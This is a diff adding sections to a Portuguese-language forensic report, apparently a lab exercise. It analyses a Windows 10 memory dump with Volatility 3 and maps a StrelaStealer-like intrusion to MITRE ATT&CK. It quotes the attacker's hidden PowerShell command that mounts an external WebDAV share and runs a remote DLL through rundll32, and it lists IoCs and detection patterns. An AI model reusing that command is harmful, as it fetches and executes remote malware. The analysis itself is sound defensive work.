@@ -88,3 +88,63 @@ Comprometimento sustentado por **PowerShell oculto** + **WebDAV externo** + **`r
 2. **Coletar** Event Logs (Security, PowerShell), Sysmon (se houver), definições da **Scheduled Task** citada, Amcache/Prefetch.  
 3. **Threat hunt** por padrões: `rundll32` chamando caminhos UNC/WebDAV; `net use \\*davwwwroot*`; conexões para os IPs citados.  
 4. **Hardening**: ASR Rules contra abuso de `rundll32`/WebDAV; **PowerShell Script Block Logging** + Constrained Language; **WDAC/AppLocker**.
+
+---
+
+## 6. Escopo & abordagem de revelação (resumo)
+**Objetivo**: compreender natureza, sistemas afetados, cronologia e impacto para mitigar riscos e endereçar causa-raiz.  
+**Âmbito**: alerta do SIEM em estação com dados financeiros; artefato: **dump de memória (~2 GB) de Windows 10**.  
+**Ferramenta**: **Volatility 3** com arquitetura de **plugins** e **tabelas de símbolos** para interpretar estruturas do SO e extrair evidências.
+
+---
+
+## 7. Perfil do sistema (windows.info)
+- **SO**: Windows 10  
+- **NT root**: `C:\Windows`  
+- **Timestamp de captura**: **2024-07-15 07:08:00 UTC**
+
+---
+
+## 8. Investigação guiada (P1–P7)
+
+**P1 — Processo malicioso**  
+`powershell.exe (PID 3692)` executando oculto → `net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`.
+
+**P2 — PPID do processo malicioso**  
+De acordo com a investigação: **PPID 4210** (pai possivelmente finalizado no momento do dump).
+
+**P3–P5 — 2º estágio, diretório e MITRE**  
+- 2º estágio: **`3435.dll`** (carregada remotamente)  
+- Diretório remoto: **`\\45.9.74.32@8888\davwwwroot\`** (WebDAV)  
+- MITRE ATT&CK: **T1218.011 — Signed Binary Proxy Execution: Rundll32**
+
+**P6 — Usuário do processo malicioso**  
+Usuário **`Elon`**, **SID** `S-1-5-21-3274565340-3808842250-3617890653-1001`; grupos incluem **Administrators** e **Domain Users**; integridade **High**.
+
+**P7 — Família de malware (enriquecimento TI)**  
+IP **45.9.74.32** sinalizado por **14/94** vendors (VirusTotal). Relações apontam para amostras compatíveis com **StrelaStealer** (roubo de credenciais de e-mail).
+
+---
+
+## 9. Mapeamento MITRE & IoCs
+
+**Táticas/Técnicas**  
+- **Defense Evasion / Execution** — **T1218.011** (*Rundll32*)  
+- **Command and Control** — uso de **WebDAV/UNC** externo  
+- **Persistence (a confirmar)** — **Scheduled Task** `{ED77AEE0-EAFB-4133-B544-9E7C5632D902}`
+
+**Indicadores (IoCs)**
+
+| Tipo | Valor | Observação |
+|---|---|---|
+| UNC / WebDAV | `\\45.9.74.32@8888\\davwwwroot\\` | Endpoint remoto usado no comando |
+| IP | `45.9.74.32` | Relacionado no VT; artefatos associados |
+| IP | `196.204.4.8:80` | Conexão HTTP por `svchost.exe (PID 1260)` |
+| Arquivo (remoto) | `3435.dll` | Carregado via `rundll32` |
+| Scheduled Task | `{ED77AEE0-EAFB-4133-B544-9E7C5632D902}` | Persistência provável |
+| Usuário | `Elon` (`S-1-5-21-3274565340-3808842250-3617890653-1001`) | Execução com alto privilégio |
+
+**Detecções sugeridas (SIGMA/Lógica)**  
+- `process.name == "rundll32.exe"` **AND** `process.command_line CONTAINS "\\\\*davwwwroot*"`  
+- `process.name == "powershell.exe"` **AND** (`command_line CONTAINS "-windowstyle hidden"` OR `command_line CONTAINS "net use \\\\"`)
+
